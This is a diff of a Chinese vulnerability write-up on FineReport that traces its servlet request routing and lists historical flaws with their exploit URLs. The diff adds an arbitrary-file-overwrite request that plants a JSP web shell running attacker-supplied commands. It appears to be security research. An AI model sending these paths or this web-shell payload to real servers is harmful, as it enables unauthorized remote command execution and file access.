@@ -23,7 +23,7 @@ FineReport（帆软报表）的安装较为简单，直接双击`windows_x64_Fin
     <url-pattern>/ReportServer</url-pattern>
   </servlet-mapping>
 ```
-ReportServlet本身包括init、destroy、createLegalModuleClassName方法，但是createLegalModuleClassName方法并不对请求进行处理。作为请求的入口类，理论上存在请求处理或参数传递，所以直接看ReportServlet的父类BaseServlet。它实现了HttpServlet，具备doGet和doPost等方法（doPost调用的也是doGet）。
+`ReportServlet`本身包括`init、destroy、createLegalModuleClassName`方法，但是`createLegalModuleClassName`方法并不对请求进行处理。作为请求的入口类，理论上存在请求处理或参数传递，所以直接看`ReportServlet`的父类`BaseServlet`。它实现了`HttpServlet`，具备doGet和doPost等方法（doPost调用的也是doGet）。
 <details>
     <summary>BaseServlet</summary>
     <pre>
@@ -58,27 +58,19 @@ public abstract class BaseServlet extends HttpServlet {
     </pre>
 </details>
 
-请求处理的核心方法`dealWithRequest`代码如下，获取op参数根据op参数调用不同方法，大多最后会调用`dealWithOp`方法
+请求处理的核心方法`dealWithRequest`代码如下，获取`op`参数根据`op`参数调用不同方法，大多最后会调用`dealWithOp()`方法
 ```java
 public static void dealWithRequest(HttpServletRequest var0, HttpServletResponse var1) throws Exception {
         extraFilter(var0, var1);
         String var2 = WebUtils.getHTTPRequestParameter(var0, "op");
         String var3 = WebUtils.getHTTPRequestParameter(var0, "sessionID");
-        if (!ClusterHelperFactory.getProvider().isUseCluster() || !ClusterHelperFactory.getProvider().CheckClusterDispatch(var0, var1, var2, var3)) {
-            if (RestartReminder.getInstance().isIntercept(var2)) { ...
-            } else if ("closesessionid".equalsIgnoreCase(var2) && var3 != null) {...
-            } else {
-                ...
-                if ("getSessionID".equalsIgnoreCase(var2)) {...
-                } else if (var3 != null && !SessionDealWith.hasSessionID(var3)) {
-                    SessionDealWith.writeSessionTimeout(var0, var1);
-                } else if (!ClusterHelperFactory.getProvider().isUseCluster() || !ClusterHelperFactory.getProvider().CheckClusterDispatch(var0, var1, var2, var3)) {
-                    if (!MemoryHelper.getMemoryAlarmProcessor().doSessionCheck(var0, var1)) {
-                        dealWeblet(var2, var3, var0, var1); // 最终调用dealWithOp方法
-                    }...
+        ...     
+        if (!MemoryHelper.getMemoryAlarmProcessor().doSessionCheck(var0, var1)) {
+            dealWeblet(var2, var3, var0, var1); // 最终调用dealWithOp方法
+        }...
     }
 ```
-dealWithOp方法根据传入的op，如果能在extraServices找到对应的就直接处理，否则就从现有的Services中，获取actionOP，然后进一步处理请求
+`dealWithOp()`方法根据传入的`op`，如果能在extraServices找到对应的就直接处理，否则就从现有的Services中，遍历每个Service的`actionOP()`方法找到与`op`值相同的，然后调用该Service的`process()`方法进一步处理请求
 ```java
 private static void dealWithOp(String var0, String var1, HttpServletRequest var2, HttpServletResponse var3) throws Exception {
         var0 = var0.toLowerCase();
@@ -104,7 +96,7 @@ private static void dealWithOp(String var0, String var1, HttpServletRequest var2
             }
             ...
 ```
-如果查看service接口，会发现确实分为了actionOP和process两种方式。
+如果查看Service接口，会发现确实分为了actionOP和process两种方式。
 ```java
 public interface Service {
     String XML_TAG = "WebService";
@@ -114,7 +106,10 @@ public interface Service {
     void process(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4) throws Exception;
 }
 ```
-后续的执行流程，可参考 - [任意文件覆盖漏洞](#任意文件覆盖漏洞)
+总结来说，就是通过传入的cp参数，找到某个Service对应的actionOP返回值与传入的cp值相同的，然后调用该Service的process方法。process后续的执行流程，可参考 - [任意文件覆盖漏洞](#任意文件覆盖漏洞)。一般是遍历该Service对应的几个Action(Action都实现自`RequestCMDReceiver`接口，该接口包含`getCMD()`方法和`actionCMD()`方法)，如果某个Action的`getCMD()`方法返回值和传入的cmd参数一致，就调用该Action的`actionCMD()`方法对请求进行处理。整体调用流程如下：
+```
+'cp' <=> Service.actionOP -> Service.process -> 'cmd' <=> Action.getCMD -> Action.actionCMD 
+```
 
 ## 历史漏洞
 
@@ -122,13 +117,15 @@ public interface Service {
 
 |漏洞名称|访问路径|影响版本|
 |:---:|:---:|:---:|
-|目录漏洞|`op=fs_remote_design&cmd=design_list_file&file_path=../`|v8|
+|目录遍历漏洞|`op=fs_remote_design&cmd=design_list_file&file_path=../`|v8|
 |任意文件读取漏洞|`op=chart&cmd=get_geo_json&resourcepath=privilege.xml`|v8|
-|未授权命令执行漏洞|`op=fr_log&cmd=fg_errinfo&fr_username=admin`|——|
+|未授权命令执行漏洞|`op=fr_log&cmd=fg_errinfo&fr_username=admin`|—|
 |文件上传漏洞|上传`op=plugin&cmd=local_install`, 移动`op=fr_server&cmd=manual_backup`|v8|
+|任意文件覆盖漏洞|`op=svginit&cmd=design_save_svg&filePath=`|v9|
+|未授权访问漏洞|`op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false`|v7|
 
 ### 任意文件覆盖漏洞
-漏洞入口类为`ChartSvgInitService`。先获取op，然后执行Service的process方法
+漏洞入口类为`ChartSvgInitService`。该Service对应的`op`值为`svginit`，然后执行Service的`process()`方法
 ```
 public class ChartSvgInitService implements Service {
     // 这些actions由此Service处理
@@ -143,7 +140,7 @@ public class ChartSvgInitService implements Service {
     }
 }
 ```
-dealForActionCMD方法代码如下，先调用某个action的getCMD方法，如果获取到的字符串值和cmd传入的参数一样，就调用该action的actionCMD方法
+`dealForActionCMD()`方法代码如下，先调用某个action的`getCMD()`方法，如果获取到的字符串值和cmd传入的参数一样，就调用该action的`actionCMD()`方法
 ```java
 public static void dealForActionCMD(HttpServletRequest var0, HttpServletResponse var1, String var2, RequestCMDReceiver[] var3, String var4) throws Exception {
         String var5 = WebUtils.getHTTPRequestParameter(var0, "op");
@@ -171,7 +168,7 @@ public static void dealForActionCMD(HttpServletRequest var0, HttpServletResponse
         }
     }
 ```
-ChartSvgInitService对应的action包括：`ChartGetSvgAction、ChartSaveSvgAction、ChartDeleteSvgAction`。漏洞位于`ChartSaveSvgAction`，其actionCMD方法如下
+ChartSvgInitService对应的action包括：`ChartGetSvgAction、ChartSaveSvgAction、ChartDeleteSvgAction`。漏洞位于`ChartSaveSvgAction`，其`actionCMD()`方法如下
 ```java
     public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception {
         String var4 = WebUtils.getHTTPRequestParameter(var1, "filePath");
@@ -201,7 +198,7 @@ ChartSvgInitService对应的action包括：`ChartGetSvgAction、ChartSaveSvgActi
         }
     }
 ```
-假如传入filePath的形式如：`filePath=chartmapsvg/../../../xxx.jsp`，那么会截取chartmapsvg后的内容拼接到`/WebReport/WEB-INF/assets/`之后。然后获取数据流var1中的内容，复制给拼接后的路径文件。获取数据流的内容是从`__CONTENT__`中获取
+假如传入filePath的形式如：`filePath=chartmapsvg/../../../xxx.jsp`，那么会截取chartmapsvg后的内容拼接到`/WebReport/WEB-INF/assets/`之后。然后获取数据流var1中的内容，复制到拼接后的路径文件中。获取数据流的内容是从`__CONTENT__`中获取
 
 ```java
 public static InputStream getInputStream(HttpServletRequest var0) {
@@ -218,6 +215,12 @@ public static InputStream getInputStream(HttpServletRequest var0) {
     }
     return var1;
 }
+```
+数据包如下
+```
+POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/shell.svg.jsp HTTP/1.1
+
+{"__CONTENT__":"<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>","__CHARSET__":"UTF-8"}
 ```
 
 
